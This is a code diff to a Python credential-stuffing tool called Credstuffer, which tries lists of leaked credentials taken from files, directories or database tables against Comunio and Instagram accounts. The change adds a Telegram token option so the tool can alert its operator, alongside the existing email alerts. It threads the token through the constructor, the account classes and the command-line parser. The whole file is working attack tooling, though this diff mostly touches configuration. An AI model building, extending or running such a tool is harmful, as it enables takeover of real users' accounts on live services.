@@ -15,7 +15,7 @@ class Credstuffer:
             credstuffer = Credstuffer()
 
     """
-    def __init__(self, account, usernames, max_requests=1000000, notify='mail', filepath=None, dirpath=None,
+    def __init__(self, account, usernames, max_requests=1000000, token=None, filepath=None, dirpath=None,
                  schemas=None, tables=None, **params):
         self.logger = logging.getLogger('credstuffer')
         self.logger.info('create class Credstuffer')
@@ -23,7 +23,8 @@ class Credstuffer:
         self.account = account
         self.usernames = usernames
         self.max_requests = max_requests
-        self.notify = notify
+        self.notify = list()
+        self.token = token
         self.filepath = filepath
         self.dirpath = dirpath
         self.mailparams = dict()
@@ -34,6 +35,9 @@ class Credstuffer:
         if 'mail' in params.keys():
             if ('smtp' and 'port' and 'sender' and 'receiver' and 'password') in params['mail'].keys():
                 self.mailparams.update(params['mail'])
+                self.notify.append('mail')
+            else:
+                self.logger.error("No mail parameters provided!")
         else:
             self.logger.error("No mail parameters provided!")
 
@@ -43,13 +47,16 @@ class Credstuffer:
         else:
             self.logger.error("No database parameters provided!")
 
+        if self.token is not None:
+            self.notify.append('telegram')
+
         # create account instances
         self.accounts = list()
         account_instance = self.create_instance(account=self.account, max_requests=self.max_requests, notify=self.notify
-                                                , **self.mailparams)
+                                                , token=self.token, **self.mailparams)
         self.accounts.append(account_instance)
 
-    def create_instance(self, account, max_requests, notify, **kwargs):
+    def create_instance(self, account, max_requests, notify, token, **kwargs):
         """ creates the account instance
 
         :param account: name of the account
@@ -59,16 +66,15 @@ class Credstuffer:
         :return: instance of the account attribute
         """
         if account == 'comunio':
-            return Comunio(max_requests=max_requests, notify=notify, **kwargs)
+            return Comunio(max_requests=max_requests, notify=notify, token=token, **kwargs)
         elif account == 'instagram':
-            return Instagram(max_requests=max_requests, notify=notify, **kwargs)
+            return Instagram(max_requests=max_requests, notify=notify, token=token, **kwargs)
         else:
             raise AccountInstanceError("Could not create Account Instance")
 
     def run(self):
-        """
+        """ runs the credstuffer application
 
-        :return:
         """
 
         # create the stuffing algorithm
@@ -122,11 +128,12 @@ def main():
     parser_notifyer.add_argument('--Nreceiver', type=str, help='email from receiver')
     parser_notifyer.add_argument('--Npassword', type=str, help='password from sender email')
 
+    parser_notifyer.add_argument('--token', type=str, help="Telegram token")
+
     # provide usernames for given account
     parser_usernames = parser.add_argument_group('Usernames', 'Provided Usernames for the account')
     parser_usernames.add_argument('--usernames', type=str,  help='Usernames for the given account')
 
-    # TODO Telegram
     parser.add_argument('-v', '--version', action='version', version=__version__, help='show the current version')
 
     args = parser.parse_args()
@@ -155,9 +162,11 @@ def main():
         if args.path is not None:
             logger.info("process credential file")
 
-            credstuffer = Credstuffer(account=args.account, usernames=account_usernames, filepath=args.path, **params)
+            credstuffer = Credstuffer(account=args.account, usernames=account_usernames, token=args.token,
+                                      filepath=args.path, **params)
         else:
-            credstuffer = Credstuffer(account=args.account, usernames=account_usernames, dirpath=args.dir, **params)
+            credstuffer = Credstuffer(account=args.account, usernames=account_usernames, token=args.token,
+                                      dirpath=args.dir, **params)
 
     else:
         logger.info("process database parameters")
@@ -172,8 +181,8 @@ def main():
         schemas = args.schemas
         tables = args.tables
 
-        credstuffer = Credstuffer(account=args.account, usernames=account_usernames, schemas=schemas, tables=tables,
-                                  **params)
+        credstuffer = Credstuffer(account=args.account, usernames=account_usernames, token=args.token,
+                                  schemas=schemas, tables=tables, **params)
 
     # run the credstuffer application
     credstuffer.run()
